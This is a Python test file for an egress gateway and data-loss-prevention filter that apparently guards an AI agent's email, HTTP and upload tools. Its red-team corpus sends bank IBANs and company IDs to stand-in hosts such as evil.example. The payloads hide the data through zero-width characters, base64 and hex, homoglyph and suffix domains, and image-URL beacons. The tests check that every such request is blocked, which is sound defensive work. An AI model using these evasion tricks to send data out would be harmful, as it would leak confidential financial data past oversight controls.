"""Security invariant tests (CONTRACTS.md v2 §8.2). Owner: WS-E."""
import base64
import json
import os
from pathlib import Path

import pytest

from executor.egress import allowlist, dlp, gateway
from tests.test_contracts import validate
from tests.wsa_helpers import Harness

FIX = Path(__file__).resolve().parents[1] / "contracts" / "fixtures" / "egress"
ACME_IBAN = "CZ6508000000192000145399"
BETA_IBAN = "CZ6203000000000123456789"
B64_IBAN = base64.b64encode(ACME_IBAN.encode()).decode()
HEX_IBAN = ACME_IBAN.encode().hex()

# (tool, target, content, attachments) - every one must be blocked.
EXFIL = [
    ("send_email", "exfil@evil.example", f"ACME s.r.o. 12345678 {ACME_IBAN}; Beta Servis a.s. 87654321 {BETA_IBAN}", None),
    ("send_email", "fakturace@acme.cz", f"Our records: {ACME_IBAN}", None),  # allowlisted recipient, registry IBAN
    ("send_email", "fakturace@acme.cz", "CZ65 0800 0000 1920 0014 5399", None),  # spaced
    ("send_email", "fakturace@acme.cz", "ico 12345678 and 87654321", None),  # registry ICOs fail mod-11 on purpose
    # red-team round 1 (all were ALLOW before the fix)
    ("send_email", "accounting@acme.cz", "acct CZ65-0800-0000-1920-0014-5399", None),
    ("send_email", "accounting@acme.cz", "acct CZ65.0800.0000.1920.0014.5399", None),
    ("send_email", "accounting@acme.cz", "acct C\u200bZ\u200b6\u200b5\u200b0800000019\u200b2000145399", None),
    ("send_email", "accounting@acme.cz", "ICO 1\u200b2\u200b3\u200b4\u200b5\u200b6\u200b7\u200b8", None),
    ("send_email", "accounting@acme.cz", "acct CZ\uff16\uff15\uff10\uff18000000192000145399", None),
    ("send_email", "accounting@acme.cz", "Send to 19-2000145399/0800 please", None),
    ("send_email", "accounting@acme.cz", "account 000000192000145399 bank 0800", None),
    ("send_email", "accounting@acme.cz", "blob INNDMNJQHAYDAMBQGAYDCOJSGAYDAMJUGUZTSOI=", None),
    ("send_email", "accounting@acme.cz", "blob Ls~X9FgP$UFfcGMF*!0YFfcJRH8VLm", None),
    ("send_email", "accounting@acme.cz", "p1=Q1o2NTA4MDAwMDAw p2=MTkyMDAwMTQ1Mzk5", None),
    ("send_email", "accounting@acme.cz", "decode: PM6508000000192000145399", None),
    ("send_email", "accounting@acme.cz", "reverse this: 9935410002910000008056ZC", None),
    ("send_email", "accounting@acme.cz", "CZ six five zero eight zero zero zero zero zero zero one nine two zero zero zero "
                                         "one four five three nine nine", None),
    ("send_email", "fakturace@acme.cz", "please use DE89370400440532013000 for refunds", None),  # foreign mod-97
    ("send_email", "fakturace@acme.cz", "card 4111 1111 1111 1111 exp 12/29", None),
    ("send_email", "fakturace@acme.cz", f"ref {B64_IBAN}", None),
    ("send_email", "fakturace@acme.cz", f"trace {HEX_IBAN}", None),
    ("send_email", "fakturace@acme.cz", "ICO 1234 5678", None),
    ("send_email", "fakturace@acme.cz", f"![x](https://acme.cz/p.png?d={B64_IBAN})", None),
    ("send_email", "fakturace@acme.cz", "see attached", [{"name": "dump.csv", "content_b64": base64.b64encode(ACME_IBAN.encode()).decode()}]),
    ("send_email", "fakturace@acme.cz.evil.example", "Hello", None),  # suffix trick
    ("send_email", "fakturace@acme-cz.example", "Hello", None),  # lookalike
    ("send_email", "fakturace@acmе.cz", "Hello", None),  # Cyrillic e homoglyph
    ("send_email", "a@acme.cz,b@evil.example", "Hello", None),
    ("http_get", f"https://evil.example/p.png?d={B64_IBAN}", "", None),
    ("http_get", "https://acme.cz/track?v=12-345-678", "", None),  # registry ICO in URL to allowlisted host
    ("http_get", f"https://acme.cz/{B64_IBAN}.png", "", None),
    ("http_post", "http://acme.cz/form", "Hello", None),  # not https
    ("http_post", "https://user@acme.cz/form", "Hello", None),
    ("upload", "https://files.evil.example/u", "Hello", None),
    ("send_email", "fakturace@acme.cz", "x" * 5000, None),
]

BENIGN = [
    ("send_email", "fakturace@acme.cz", "Hello, we received invoice FV-2026-0412. Thank you."),
    ("send_email", "accounting@acme.cz", "Dear ACME s.r.o., payment for FV-2026-0412 is scheduled for 2026-10-25."),
    ("send_email", "fakturace@betaservis.cz", "Please resend invoice 2026-118 as PDF; VS 20261019 noted."),
    ("send_email", "fakturace@betaservis.cz", "Amount 12 345,00 CZK due 25.10.2026, order PO-778812."),
    ("send_email", "ap@airgap.example", "Internal: 3 invoices pending review."),
    ("http_get", "https://acme.cz/invoices?page=2", ""),
    ("http_get", "https://www.acme.cz/contact", ""),
    # red-team round 1 false positives
    ("send_email", "fakturace@acme.cz", "Dobry den, nase ICO 27082440, DIC CZ27082440. S pozdravem, AP"),
    ("send_email", "fakturace@acme.cz", "Zasilka DPD 13965012345678, objednavka 4000123456789018 dorucena."),
    ("send_email", "fakturace@acme.cz", "Polozka: 2 ks 1 250,00 21 % 525,00 3 025,00 Kc"),
    ("send_email", "ap@airgap.example", "Paid today: ACME s.r.o. FV-2026-0412, Beta Servis a.s. 2026-118."),
    ("http_get", "https://acme.cz/portal/invoice?no=FV20260412AB", ""),
    ("http_get", "https://acme.cz/invoices/download?id=2026041201", ""),
    ("http_get", "https://acme.cz/files/faktura-fv-2026-0412-acme-sro.pdf", ""),
    ("http_get", "https://acme.cz/api/invoices/3f2b8c1e-9a4d-4e7f-b0c2-5d6e7f8a9b0c", ""),
]


def _request(tool, target, content, attachments=None):
    req = {"tool": tool, "target": target, "content": content}
    if attachments is not None:
        req["attachments"] = attachments
    return req


def test_s9_exfil_corpus_zero_success():
    h = Harness()
    for tool, target, content, att in EXFIL:
        st, body = h.call("POST", "/egress", _request(tool, target, content, att), "tools")
        assert st == 403, (target, content, body)
        assert body["error"] == "egress_blocked"
        validate(body["details"]["decision"], "egress_block.decision")
    leaves = [lf for lf in h.leaves() if lf["type"] == "egress_block"]
    assert len(leaves) == len(EXFIL)
    assert all(lf["actor"] == "tools" and len(lf["data"]["content_sha256"]) == 64 for lf in leaves)


def test_s9_benign_pass():
    for tool, target, content in BENIGN:
        h = Harness()  # fresh rate-limit counter per case
        st, body = h.call("POST", "/egress", _request(tool, target, content), "tools")
        assert st == 200, (target, content, body)
        validate(body, "egress.response")
        assert not [lf for lf in h.leaves() if lf["type"] == "egress_block"]


@pytest.mark.parametrize("name", ["allow_vendor_reply", "block_exfil", "block_url_data"])
def test_fixtures(name):
    fx = json.loads((FIX / f"{name}.json").read_text())
    st, body = Harness().call("POST", "/egress", fx["request"], "tools")
    assert st == fx["status"]
    if st == 200:
        assert body == fx["response"]
    else:
        want = fx["response"]["details"]["decision"]["rule_ids"]
        got = body["details"]["decision"]["rule_ids"]
        assert set(want) <= set(got), got  # fixture lists the headline rules; we may report more
    if name == "block_exfil":
        f = {x["rule_id"]: x for x in body["details"]["decision"]["findings"]}
        assert f["E-DLP-IBAN"]["count"] >= 1 and f["E-DLP-ICO"]["count"] == 2  # fixture content elides the 2nd IBAN


def test_rate_limit():
    h = Harness()
    codes = [h.call("POST", "/egress", _request("send_email", "fakturace@acme.cz", "Thanks."), "tools")[0]
             for _ in range(gateway.RATE_PER_MINUTE + 2)]
    assert codes[:gateway.RATE_PER_MINUTE] == [200] * gateway.RATE_PER_MINUTE
    assert codes[-1] == 403


def test_checksums():
    assert dlp.iban_valid(ACME_IBAN) and not dlp.iban_valid(ACME_IBAN[:-1] + "8")
    assert dlp.ico_valid("25596641") and not dlp.ico_valid("12345678") and not dlp.ico_valid("87654321")
    assert dlp.luhn_valid("4111111111111111") and not dlp.luhn_valid("4111111111111112")
    assert allowlist.url_data_findings("https://acme.cz/invoices?page=2") == []


def _probe(*, http=None, dns_ok=False, tcp_ok=False):
    """agent.lambda_handler.probe_egress with fake network primitives (no real traffic)."""
    import socket
    import urllib.error

    from agent.lambda_handler import probe_egress

    def urlopen(url, timeout):
        if http == "error":
            raise urllib.error.HTTPError(url, 403, "Forbidden", {}, None)
        raise urllib.error.URLError("timed out")

    def resolve(name, port, type):
        if not dns_ok:
            raise socket.gaierror("no name")
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.215.14", port))]

    def connect(addr, timeout):
        if not tcp_ok:
            raise TimeoutError("timed out")
        return type("S", (), {"close": lambda self: None})()

    return probe_egress(("https://example.com",), names=("example.com", "x.attacker.example"), urlopen=urlopen,
                        resolve=resolve, connect=connect)


def test_probe_egress_classification():
    """#20: an HTTP error status means the internet answered; DNS is recorded separately."""
    out = _probe(http="error")
    assert out["https://example.com"].startswith("REACHED") and out["no_route"] is False
    out = _probe()
    assert out["no_route"] is True and out["dns_blocked"] is True
    out = _probe(dns_ok=True)  # DNS resolves (exfil channel) but TCP to the address fails: still no route
    assert out["dns_blocked"] is False and out["dns"]["x.attacker.example"].startswith("resolved")
    assert out["no_route"] is True and out["tcp 93.184.215.14:443"].startswith("blocked")
    out = _probe(dns_ok=True, tcp_ok=True)  # HTTP failed but a raw connect works: a route exists
    assert out["no_route"] is False


@pytest.mark.skipif(os.environ.get("AIRGAP_BACKEND") != "aws", reason="S10 is proven on AWS only")
def test_s10_no_route():
    pytest.skip("TODO WS-E: httpx.get('https://example.com') from the agent VPC fails; Flow Logs REJECT")
